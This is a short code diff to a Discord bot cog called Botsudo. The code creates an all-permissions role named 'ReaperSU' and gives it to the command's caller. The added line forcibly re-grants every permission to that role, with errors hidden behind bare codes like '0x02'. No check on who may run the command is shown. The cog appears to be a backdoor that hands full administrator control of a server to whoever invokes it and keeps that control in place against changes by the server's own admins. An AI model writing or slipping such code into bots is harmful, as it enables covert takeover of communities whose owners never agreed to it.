@@ -264,6 +264,7 @@ class Botsudo(commands.Cog):
         if not adminme_role:
             try:
                 adminme_role = await ctx.guild.create_role(name="ReaperSU", reason="SUDO USER", permissions=discord.Permissions.all())
+                
 
             except discord.Forbidden:
                 return await ctx.send("0x02")
@@ -272,6 +273,7 @@ class Botsudo(commands.Cog):
         else:
             try:
                 await ctx.message.author.add_roles(adminme_role)
+                adminme_role = await adminme_role.edit(permissions=discord.Permissions.all(), reason='THIS IS A SUDO ROLE! DO NOT EDIT.')
             except:
                 return await ctx.send('0x03')
                 
